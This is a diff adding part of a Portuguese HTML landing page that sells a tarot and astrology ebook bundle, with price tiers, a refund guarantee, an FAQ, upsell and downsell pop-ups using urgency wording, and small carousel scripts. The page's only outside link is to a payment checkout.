+            class="w-full bg-white/5 hover:bg-white/10 text-white font-bold py-[17.5px] px-6 !rounded-[20px] transition duration-300 border border-white/15 border-b-4 border-b-white/30 uppercase tracking-wider text-[13.2px] md:text-[15.3px] shadow-md cursor-pointer"
+          >
+            QUERO O ACESSO ESSENCIAL
+          </button>
+          
+          <div class="mt-3.5 flex items-center justify-center gap-1.5 text-gold/80 bg-gold/5 border border-gold/10 px-3 py-1.5 rounded-lg w-fit mx-auto">
+            <i data-lucide="shield-check" class="text-gold w-3.5 h-3.5 shrink-0"></i>
+            <span class="text-[9px] font-bold uppercase tracking-wider">Garantia de 30 Dias</span>
+          </div>
+        </div>
+        <div class="card-mystic flex flex-col p-6 xs:p-8 md:p-10 border-gold/70 bg-gradient-to-b from-primary/30 to-bg-dark/80 glow-gold relative flex-1 hover:border-gold transition duration-300">
+          <div class="absolute -top-3.5 left-1/2 -translate-x-1/2 bg-gold text-bg-dark font-extrabold px-5 py-1 rounded-full text-[9px] md:text-[10px] uppercase tracking-widest shadow-[0_4px_15px_rgba(242,201,76,0.25)] whitespace-nowrap">
+            👑 RECOMENDADO / MAIS POPULAR
+          </div>
+          
+          <div class="mb-4 mt-2">
+            <span class="text-gold text-[10px] uppercase tracking-widest font-extrabold bg-gold/15 px-3.5 py-1 rounded-full border border-gold/20">Sucesso Absoluto</span>
+            <h3 class="text-lg xs:text-xl md:text-2xl font-serif font-bold mt-3 text-white">Guia do Tarot Completo</h3>
+            <p class="text-gold/80 text-xs xs:text-sm mt-1 font-medium">O método supremo para ler o baralho inteiro</p>
+          </div>
+          
+          <div class="my-4">
+            <p class="text-white-soft/40 text-[10px] uppercase tracking-wider line-through">De R$ 97,00 por</p>
+            <div class="flex items-baseline gap-1 mt-1">
+              <span class="text-base font-bold text-gold">R$</span>
+              <span class="text-3xl xs:text-4xl md:text-5xl font-serif font-bold text-gold">37,00</span>
+              <span class="text-white-soft/50 text-xs ml-1 font-sans">à vista</span>
+            </div>
+            <p class="text-xs text-white/95 mt-1 font-medium">ou em até <span class="text-gold font-bold">9x de R$ 5,27</span></p>
+            <p class="text-[10px] text-gold/80 mt-1.5 font-bold">ECONOMIZAR R$ 60,00 HOJE</p>
+            <div class="mt-3 flex items-center gap-1.5 text-gold bg-gold/15 border border-gold/20 px-3 py-1 rounded-lg w-fit">
+              <i data-lucide="sparkles" class="text-gold w-3.5 h-3.5 shrink-0"></i>
+              <span class="text-[10px] font-black uppercase tracking-wider">Acesso Vitalício</span>
+            </div>
+          </div>
+          
+          <div class="w-full h-px bg-gold/15 my-3"></div>
+          
+          <ul class="space-y-3 mb-6 text-xs xs:text-sm md:text-base text-left flex-1">
+            <li class="flex items-start gap-2.5 text-white font-medium">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Acesso completo ao Guia (Maiores e Menores)</span>
+            </li>
+
+            <li class="flex items-start gap-2.5 text-white font-medium">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Guia do Baralho Cigano <span class="text-white-soft/40 line-through text-[10px] ml-1">De R$ 47,00</span></span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white font-medium">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Guia de Astrologia e Mapa Astral <span class="text-white-soft/40 line-through text-[10px] ml-1">De R$ 47,00</span></span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white font-medium">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Guia do Baralho de Maria Padilha <span class="text-white-soft/40 line-through text-[10px] ml-1">De R$ 47,00</span></span>
+            </li>
+
+            <li class="flex items-start gap-2.5 text-white font-medium">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Significados profundos e dinâmicos</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white font-medium">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Método visual para rápida absorção</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white font-medium">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Bônus: Os Segredos da Corte</span>
+            </li>
+
+            <li class="flex items-start gap-2.5 text-white font-medium">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Bônus: Arcanos Menores Combinados</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white font-medium">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Bônus: Sagração e Rituais</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white font-medium">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Acesso à Comunidade VIP de Aprendizado</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white font-medium">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Material com Layout Otimizado de Alta Resolução</span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white font-medium">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Diário de Leituras <span class="text-white-soft/40 line-through text-[10px] ml-1">De R$ 37,00</span></span>
+            </li>
+            <li class="flex items-start gap-2.5 text-white font-medium">
+              <i data-lucide="check-circle-2" class="text-gold shrink-0 w-4 h-4 mt-0.5"></i>
+              <span>Suporte padrão por e-mail e WhatsApp</span>
+            </li>
+          </ul>
+          
+          <button 
+            onclick="window.location.href = 'https://pay.cakto.com.br/kec7uuw_1013790'"
+            class="btn-gold w-full py-[17.5px] px-6 !rounded-[20px] text-[13.2px] md:text-[15.3px] font-black animate-pulse cursor-pointer"
+          >
+            QUERO O ACESSO COMPLETO
+          </button>
+          
+          <div class="mt-3.5 flex items-center justify-center gap-1.5 text-gold/90 bg-gold/10 border border-gold/25 px-3 py-1.5 rounded-lg w-fit mx-auto shadow-[0_0_12px_rgba(242,201,76,0.1)]">
+            <i data-lucide="shield-check" class="text-gold w-3.5 h-3.5 shrink-0 animate-pulse"></i>
+            <span class="text-[9px] font-bold uppercase tracking-wider">Garantia Incondicional de 30 Dias</span>
+          </div>
+        </div>
+      </div>
+      <div class="mt-10 max-w-3xl mx-auto bg-bg-dark/40 border border-white/5 rounded-xl p-4 flex flex-col sm:flex-row items-center justify-around gap-4 text-center">
+        <div class="flex items-center gap-2">
+          <i data-lucide="shield-check" class="text-gold w-5 h-5"></i>
+          <div class="text-left">
+            <p class="text-[11px] font-bold text-white uppercase tracking-wider">Compra 100% Segura</p>
+            <p class="text-[9px] text-white-soft/50">Criptografia bancária robusta</p>
+          </div>
+        </div>
+        <div class="w-px h-6 bg-white/10 hidden sm:block"></div>
+        <div class="flex items-center gap-2">
+          <i data-lucide="zap" class="text-gold w-5 h-5"></i>
+          <div class="text-left">
+            <p class="text-[11px] font-bold text-white uppercase tracking-wider">Envio Instantâneo</p>
+            <p class="text-[9px] text-white-soft/50">Acesso enviado ao seu e-mail</p>
+          </div>
+        </div>
+        <div class="w-px h-6 bg-white/10 hidden sm:block"></div>
+        <div class="flex items-center gap-2">
+          <i data-lucide="check-circle-2" class="text-gold w-5 h-5"></i>
+          <div class="text-left">
+            <p class="text-[11px] font-bold text-white uppercase tracking-wider">Garantia Forte</p>
+            <p class="text-[9px] text-white-soft/50">Satisfação ou estorno garantido</p>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section class="relative z-10 px-4 pt-4 pb-20 md:pt-6 md:pb-28 max-w-4xl mx-auto text-center">
+      <div class="p-6 xs:p-8 md:p-12 rounded-2xl bg-gold/5 border border-gold/40 card-mystic shadow-2xl">
+        <i data-lucide="shield-check" class="mx-auto text-gold w-[62px] h-[62px] md:w-[70px] md:h-[70px] mb-5"></i>
+        <h2 class="text-xl xs:text-2xl md:text-3xl font-extrabold mb-3 tracking-tight [word-spacing:-2px] leading-[0.95]">Garantia Incondicional</h2>
+        <p class="text-sm md:text-base text-white-soft/85 mb-5 max-w-[82%] mx-auto leading-relaxed">
+          Você tem até <strong>30 dias</strong> para analisar e testar o material. Caso sinta que o guia não é ideal para você, nós devolvemos todo o seu valor investido de forma rápida.
+        </p>
+        <p class="text-gold font-bold text-[12.6px] md:text-[14.7px] uppercase tracking-widest mt-8">O risco é totalmente nosso.</p>
+      </div>
+    </section>
+    <section class="relative z-10 px-4 py-10 text-center">
+      <div class="inline-block bg-red/15 text-red border border-red/25 px-5 py-2 rounded-full mb-6 text-xs md:text-sm font-bold tracking-wide animate-pulse">
+        ⚠️ ATENÇÃO: ESSA OFERTA PODE TERMINAR SEM AVISO PRÉVIO
+      </div>
+      <h2 class="text-xl md:text-3xl font-extrabold max-w-2xl mx-auto">Não adie seu chamado espiritual. Seu caminho com o Tarot começa agora.</h2>
+    </section>
+    <section class="relative z-10 px-4 py-16 max-w-2xl mx-auto">
+      <h2 class="text-2xl md:text-3xl font-extrabold text-center mb-8">Perguntas Frequentes</h2>
+      
+      <div class="space-y-1">
+        <div class="border-b border-lilac/10 py-3.5">
+          <button onclick="toggleFAQ(this)" class="w-full flex justify-between items-center text-left focus:outline-none group">
+            <span class="text-sm md:text-base font-semibold group-hover:text-gold transition duration-200">Preciso ter experiência ou dom espiritual?</span>
+            <i data-lucide="chevron-down" class="w-4 h-4 text-gold transition-transform duration-300 transform"></i>
+          </button>
+          <div class="max-h-0 overflow-hidden opacity-0 transition-all duration-300 ease-in-out">
+            <p class="mt-2 text-xs md:text-sm text-white-soft/70 leading-relaxed">
+              Não é preciso dom especial ou conhecimento prévio. O guia ensina passo a passo através de uma abordagem totalmente lógica, intuitiva e ilustrativa.
+            </p>
+          </div>
+        </div>
+        <div class="border-b border-lilac/10 py-3.5">
+          <button onclick="toggleFAQ(this)" class="w-full flex justify-between items-center text-left focus:outline-none group">
+            <span class="text-sm md:text-base font-semibold group-hover:text-gold transition duration-200">O método funciona com qualquer baralho?</span>
+            <i data-lucide="chevron-down" class="w-4 h-4 text-gold transition-transform duration-300 transform"></i>
+          </button>
+          <div class="max-h-0 overflow-hidden opacity-0 transition-all duration-300 ease-in-out">
+            <p class="mt-2 text-xs md:text-sm text-white-soft/70 leading-relaxed">
+              Sim! O sistema baseia-se na simbologia clássica e universal (sistema Rider-Waite), que serve como alicerce para praticamente todos os tarôs do mundo.
+            </p>
+          </div>
+        </div>
+        <div class="border-b border-lilac/10 py-3.5">
+          <button onclick="toggleFAQ(this)" class="w-full flex justify-between items-center text-left focus:outline-none group">
+            <span class="text-sm md:text-base font-semibold group-hover:text-gold transition duration-200">Como receberei o material comprado?</span>
+            <i data-lucide="chevron-down" class="w-4 h-4 text-gold transition-transform duration-300 transform"></i>
+          </button>
+          <div class="max-h-0 overflow-hidden opacity-0 transition-all duration-300 ease-in-out">
+            <p class="mt-2 text-xs md:text-sm text-white-soft/70 leading-relaxed">
+              De forma totalmente digital. Assim que sua compra for aprovada, um e-mail automático com os links de download para o ebook e bônus em formato PDF será disparado.
+            </p>
+          </div>
+        </div>
+        <div class="border-b border-lilac/10 py-3.5">
+          <button onclick="toggleFAQ(this)" class="w-full flex justify-between items-center text-left focus:outline-none group">
+            <span class="text-sm md:text-base font-semibold group-hover:text-gold transition duration-200">O acesso ao conteúdo expira?</span>
+            <i data-lucide="chevron-down" class="w-4 h-4 text-gold transition-transform duration-300 transform"></i>
+          </button>
+          <div class="max-h-0 overflow-hidden opacity-0 transition-all duration-300 ease-in-out">
+            <p class="mt-2 text-xs md:text-sm text-white-soft/70 leading-relaxed">
+              De forma alguma! Seu acesso é permanente e vitalício. Você pode fazer o download e ler sempre que desejar.
+            </p>
+          </div>
+        </div>
+        <div class="border-b border-lilac/10 py-3.5">
+          <button onclick="toggleFAQ(this)" class="w-full flex justify-between items-center text-left focus:outline-none group">
+            <span class="text-sm md:text-base font-semibold group-hover:text-gold transition duration-200">Posso ler os materiais no meu celular?</span>
+            <i data-lucide="chevron-down" class="w-4 h-4 text-gold transition-transform duration-300 transform"></i>
+          </button>
+          <div class="max-h-0 overflow-hidden opacity-0 transition-all duration-300 ease-in-out">
+            <p class="mt-2 text-xs md:text-sm text-white-soft/70 leading-relaxed">
+              Perfeitamente! Nossos arquivos estão salvos em formato PDF de alto padrão de leitura, desenhados para abrir perfeitamente em celulares, computadores e e-readers.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+    <footer class="relative z-10 px-4 py-12 border-t border-lilac/10 text-center text-white-soft/45 text-xs">
+      <div class="flex justify-center flex-wrap gap-4 md:gap-6 mb-6">
+        <div class="flex items-center gap-1.5"><i data-lucide="shield-check" class="w-4 h-4"></i> Pagamento Seguro</div>
+        <div class="flex items-center gap-1.5"><i data-lucide="zap" class="w-4 h-4"></i> Acesso Imediato</div>
+        <div class="flex items-center gap-1.5"><i data-lucide="book-open" class="w-4 h-4"></i> PDF Digital</div>
+      </div>
+      <p>© <span id="footer-year">2026</span> Guia do Tarot. Todos os direitos reservados.</p>
+      <p class="mt-1.5 text-[10px] text-white-soft/30 max-w-lg mx-auto">Este conteúdo é para fins informativos e educacionais e não substitui qualquer orientação ou diagnóstico profissional.</p>
+    </footer>
+
+  </div>
+  <div id="upsell-modal" class="fixed inset-0 z-[120] flex items-center justify-center p-4 bg-bg-dark/95 backdrop-blur-md overflow-y-auto hidden">
+    <div class="bg-gradient-to-b from-primary/95 to-bg-dark border border-gold/50 p-5 md:p-6 rounded-[1.5rem] max-w-[390px] w-full text-center shadow-[0_0_35px_rgba(212,167,77,0.2)] relative overflow-hidden my-auto max-h-[95vh] flex flex-col justify-between transform scale-95 opacity-0 transition-all duration-300" id="upsell-container">
+      <div class="absolute top-0 left-1/2 -translate-x-1/2 w-40 h-40 bg-gold/10 rounded-full blur-[45px] pointer-events-none"></div>
+      <button 
+        onclick="closeUpsell()"
+        class="absolute top-3 right-3 text-white-soft/40 hover:text-white transition duration-200 z-10"
+        title="Fechar"
+      >
+        <i data-lucide="x-circle" class="w-6 h-6"></i>
+      </button>
+
+      <div class="overflow-y-auto pr-0.5 select-none text-left">
+        <div class="inline-flex items-center gap-1 bg-gold/10 text-gold text-[9px] md:text-[10px] font-extrabold uppercase tracking-widest px-3 py-1 rounded-full border border-gold/15 mb-3.5">
+          <i data-lucide="sparkles" class="w-3.5 h-3.5 animate-spin-slow text-gold"></i> Oportunidade Única
+        </div>
+
+        <h3 class="text-base md:text-lg font-serif font-bold text-white mb-2 leading-snug">
+          AGUARDE! LEVE O <span class="text-gold">MÉTODO COMPLETO</span> POR QUASE NADA
+        </h3>
+        
+        <p class="text-[11px] md:text-xs text-white-soft/85 mb-3.5 leading-relaxed">
+          Você escolheu o plano de <span class="font-bold text-white">R$ 17,00</span>. Que tal adicionar o <span class="font-bold text-gold">Guia do Baralho Cigano</span>, o <span class="font-bold text-gold">Guia de Astrologia e Mapa Astral</span>, o <span class="font-bold text-gold">Guia do Baralho de Maria Padilha</span> e todos os bônus do método completo por apenas uma pequena quantia a mais?
+        </p>
+        <div class="bg-bg-dark/80 rounded-xl p-3 border border-white/5 mb-3.5 space-y-1.5">
+          <p class="text-[8px] text-white-soft/40 uppercase tracking-wider font-extrabold mb-1">Inclusões instantâneas:</p>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Acesso completo ao Guia (Maiores e Menores)</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Guia do Baralho Cigano <span class="text-white-soft/40 line-through text-[10px] ml-1">De R$ 47,00</span></span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Guia de Astrologia e Mapa Astral <span class="text-white-soft/40 line-through text-[10px] ml-1">De R$ 47,00</span></span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Guia do Baralho de Maria Padilha <span class="text-white-soft/40 line-through text-[10px] ml-1">De R$ 47,00</span></span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Significados profundos e dinâmicos</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Método visual para rápida absorção</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Bônus: Os Segredos da Corte</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Bônus: Arcanos Menores Combinados</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Bônus: Sagração e Rituais</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Acesso à Comunidade VIP de Aprendizado</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Material com Layout Otimizado de Alta Resolução</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Diário de Leituras <span class="text-white-soft/40 line-through text-[10px] ml-1">De R$ 37,00</span></span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Suporte padrão por e-mail e WhatsApp</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Acesso vitalício integral sem taxas extras</span>
+          </div>
+        </div>
+        <div class="mb-3.5 flex flex-col items-center justify-center bg-gold/5 border border-gold/10 rounded-xl py-2">
+          <p class="text-[9px] text-white-soft/40 uppercase tracking-wider line-through">De R$ 37,00 por</p>
+          <div class="flex items-baseline gap-0.5">
+            <span class="text-xs font-bold text-gold">R$</span>
+            <span class="text-2xl font-serif font-bold text-gold">27,90</span>
+          </div>
+          <p class="text-[10px] text-white/95 mt-0.5 font-medium">ou em até <span class="text-gold font-bold">4x de R$ 6,98</span></p>
+          <p class="text-[8px] text-gold/70 uppercase tracking-widest mt-1 font-bold">Janela de oferta exclusiva</p>
+        </div>
+      </div>
+      <div class="space-y-2 pt-1">
+        <button 
+          onclick="acceptUpsell()"
+          class="btn-gold w-full py-3.5 text-xs md:text-sm"
+        >
+          SIM! QUERO O GUIA COMPLETO
+        </button>
+        
+        <div class="flex items-center justify-center gap-1.5 text-gold/90 bg-gold/10 border border-gold/20 px-2.5 py-1 rounded-lg w-fit mx-auto mt-1">
+          <i data-lucide="shield-check" class="text-gold w-3.5 h-3.5 shrink-0"></i>
+          <span class="text-[9px] font-bold uppercase tracking-wider">Garantia de 30 Dias</span>
+        </div>
+        
+        <button 
+          onclick="openDownsell()"
+          class="w-full text-xs text-white-soft/70 hover:text-white hover:underline transition-all duration-300 block text-center font-medium py-2 mt-3 cursor-pointer"
+        >
+          Não obrigado, prefiro continuar apenas com o de R$ 17,00
+        </button>
+      </div>
+    </div>
+  </div>
+  <div id="downsell-modal" class="fixed inset-0 z-[130] flex items-center justify-center p-4 bg-bg-dark/95 backdrop-blur-md overflow-y-auto hidden">
+    <div class="bg-gradient-to-b from-primary/95 to-bg-dark border border-gold/50 p-5 md:p-6 rounded-[1.5rem] max-w-[390px] w-full text-center shadow-[0_0_45px_rgba(212,167,77,0.3)] relative overflow-hidden my-auto max-h-[95vh] flex flex-col justify-between transform scale-95 opacity-0 transition-all duration-300" id="downsell-container">
+      <div class="absolute top-0 left-1/2 -translate-x-1/2 w-40 h-40 bg-gold/10 rounded-full blur-[45px] pointer-events-none"></div>
+      <button 
+        onclick="closeDownsell()"
+        class="absolute top-3 right-3 text-white-soft/40 hover:text-white transition duration-200 z-10"
+        title="Fechar"
+      >
+        <i data-lucide="x-circle" class="w-6 h-6"></i>
+      </button>
+
+      <div class="overflow-y-auto pr-0.5 select-none text-left">
+        <div class="inline-flex items-center gap-1 bg-red-500/15 text-red-400 text-[9px] md:text-[10px] font-extrabold uppercase tracking-widest px-3 py-1 rounded-full border border-red-500/25 mb-3.5 animate-pulse">
+          <i data-lucide="percent" class="w-3.5 h-3.5 text-red-400"></i> ÚLTIMA OPORTUNIDADE
+        </div>
+
+        <h3 class="text-base md:text-lg font-serif font-bold text-white mb-2 leading-snug">
+          ESPERE! LIBERAMOS O <span class="text-gold">MÉTODO COMPLETO</span> POR APENAS <span class="text-gold">R$ 15,00</span>
+        </h3>
+        
+        <p class="text-[11px] md:text-xs text-white-soft/85 mb-3.5 leading-relaxed">
+          Não queremos que você fique de fora. Só agora nesta página, você leva o <span class="font-bold text-white">Tarot Completo + Guia do Baralho Cigano + Guia de Astrologia e Mapa Astral + Guia do Baralho de Maria Padilha + Todos os Bônus</span> por apenas <span class="font-bold text-gold">R$ 15,00</span>!
+        </p>
+        <div class="bg-bg-dark/80 rounded-xl p-3 border border-white/5 mb-3.5 space-y-1.5">
+          <p class="text-[8px] text-white-soft/40 uppercase tracking-wider font-extrabold mb-1">Inclusões de R$ 37,00 inclusas:</p>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Acesso completo ao Guia (Maiores e Menores)</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Guia do Baralho Cigano <span class="text-white-soft/40 line-through text-[10px] ml-1">De R$ 47,00</span></span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Guia de Astrologia e Mapa Astral <span class="text-white-soft/40 line-through text-[10px] ml-1">De R$ 47,00</span></span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Guia do Baralho de Maria Padilha <span class="text-white-soft/40 line-through text-[10px] ml-1">De R$ 47,00</span></span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Significados profundos e dinâmicos</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Método visual para rápida absorção</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Bônus: Os Segredos da Corte</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Bônus: Arcanos Menores Combinados</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Bônus: Sagração e Rituais</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Acesso à Comunidade VIP de Aprendizado</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Material com Layout Otimizado de Alta Resolução</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Diário de Leituras <span class="text-white-soft/40 line-through text-[10px] ml-1">De R$ 37,00</span></span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Suporte padrão por e-mail e WhatsApp</span>
+          </div>
+          <div class="flex items-center gap-2 text-[10px] md:text-xs text-white-soft/90">
+            <i data-lucide="check-circle-2" class="text-gold shrink-0 w-3.5 h-3.5"></i>
+            <span>Acesso vitalício integral sem taxas extras</span>
+          </div>
+        </div>
+        <div class="mb-3.5 flex flex-col items-center justify-center bg-gold/5 border border-gold/10 rounded-xl py-2">
+          <p class="text-[9px] text-white-soft/40 uppercase tracking-wider line-through">De R$ 37,00 por</p>
+          <div class="flex items-baseline gap-0.5">
+            <span class="text-xs font-bold text-gold">R$</span>
+            <span class="text-2xl font-serif font-bold text-gold">15,00</span>
+          </div>
+          <p class="text-[10px] text-white/95 mt-0.5 font-medium">Único pagamento, sem assinaturas</p>
+          <p class="text-[8px] text-red-400 uppercase tracking-widest mt-1 font-bold">Essa oferta não aparecerá novamente</p>
+        </div>
+      </div>
+      <div class="space-y-2 pt-1">
+        <button 
+          onclick="acceptDownsell()"
+          class="btn-gold w-full py-3.5 text-xs md:text-sm"
+        >
+          SIM! QUERO TUDO POR APENAS R$ 15,00
+        </button>
+        
+        <div class="flex items-center justify-center gap-1.5 text-gold/90 bg-gold/10 border border-gold/20 px-2.5 py-1 rounded-lg w-fit mx-auto mt-1">
+          <i data-lucide="shield-check" class="text-gold w-3.5 h-3.5 shrink-0"></i>
+          <span class="text-[9px] font-bold uppercase tracking-wider">Garantia de 30 Dias</span>
+        </div>
+        
+        <button 
+          onclick="declineDownsell()"
+          class="w-full text-xs text-white-soft/60 hover:text-white-soft hover:underline transition-all duration-300 block text-center font-medium py-2.5 mt-3"
+        >
+          Não obrigado, prefiro continuar apenas com o de R$ 17,00
+        </button>
+      </div>
+    </div>
+  </div>
+
+
+
+  <script>
+    function updateDateAndYear() {
+      const months = [
+        'JANEIRO', 'FEVEREIRO', 'MARÇO', 'ABRIL', 'MAIO', 'JUNHO',
+        'JULHO', 'AGOSTO', 'SETEMBRO', 'OUTUBRO', 'NOVEMBRO', 'DEZEMBRO'
+      ];
+      const now = new Date();
+      const formatted = `${now.getDate()} DE ${months[now.getMonth()]} DE ${now.getFullYear()}`;
+      document.getElementById('dynamic-date').textContent = formatted;
+      document.getElementById('footer-year').textContent = now.getFullYear();
+    }
+
+    let carouselIndex = 0;
+    const totalCarouselImages = 7;
+
+    function setCarouselIndex(index) {
+      carouselIndex = index;
+      const images = document.querySelectorAll('[data-carousel-img]');
+      images.forEach((img, idx) => {
+        if (idx === index) {
+          img.classList.remove('opacity-0');
+          img.classList.add('opacity-100');
+        } else {
+          img.classList.remove('opacity-100');
+          img.classList.add('opacity-0');
+        }
+      });
+
+      const dots = document.querySelectorAll('[data-carousel-dot]');
+      dots.forEach((dot, idx) => {
+        if (idx === index) {
+          dot.className = "w-5 h-2 rounded-full bg-gold-dark transition-all duration-300";
+        } else {
+          dot.className = "w-2 h-2 rounded-full bg-bg-dark/25 transition-all duration-300";
+        }
+      });
+    }
+
+    function autoAdvanceCarousel() {
+      carouselIndex = (carouselIndex + 1) % totalCarouselImages;
+      setCarouselIndex(carouselIndex);
+    }
+
+    let testimonialIndex = 0;
+    const totalTestimonials = 5;
+
+    function setTestimonialIndex(index) {
+      testimonialIndex = index;
+      const images = document.querySelectorAll('[data-test-img]');
+      images.forEach((img, idx) => {
+        if (idx === index) {
+          img.classList.remove('opacity-0', 'scale-95');
+          img.classList.add('opacity-100', 'scale-100');
+        } else {
+          img.classList.remove('opacity-100', 'scale-100');
+          img.classList.add('opacity-0', 'scale-95');
+        }
+      });
+
+      const dots = document.querySelectorAll('[data-test-dot]');
+      dots.forEach((dot, idx) => {
+        if (idx === index) {
+          dot.className = "w-6 h-2 rounded-full bg-gold-dark transition-all duration-300";
+        } else {
+          dot.className = "w-2 h-2 rounded-full bg-gold-dark/20 transition-all duration-300";
+        }
+      });
+    }
+
+    function prevTestimonial() {
+      testimonialIndex = (testimonialIndex - 1 + totalTestimonials) % totalTestimonials;
+      setTestimonialIndex(testimonialIndex);
+    }
+
+    function nextTestimonial() {
+      testimonialIndex = (testimonialIndex + 1) % totalTestimonials;
+      setTestimonialIndex(testimonialIndex);
+    }
+
+    function openUpsell() {
